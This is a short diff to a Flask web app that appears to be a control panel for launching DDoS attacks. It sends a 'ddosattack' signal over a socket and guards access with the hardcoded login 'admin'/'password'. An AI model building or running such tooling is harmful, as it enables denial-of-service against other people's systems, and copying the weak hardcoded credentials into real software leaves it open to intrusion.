@@ -1,3 +1,5 @@
+#!/usr/bin/env python
+
 from flask import Flask
 from flask import Flask, flash, redirect, render_template, request, session, abort
 import os
@@ -17,6 +19,7 @@ def home():
 def do_admin_login():
     if request.form['password'] == 'password' and request.form['username'] == 'admin':
         session['logged_in'] = True
+        return render_template('update.html')
     else:
         flash('wrong password!')
     
@@ -29,7 +32,7 @@ def conn():
     data = json.loads(data_b.decode('utf-8'))
     return render_template('update.html', data = data)
     
-    if request.form['submit'] == 'ddosattak':
+    if request.form['submit'] == 'ddosattack':
         segnale = request.form['submit']
         sock.send(segnale.encode('utf-8'))
         
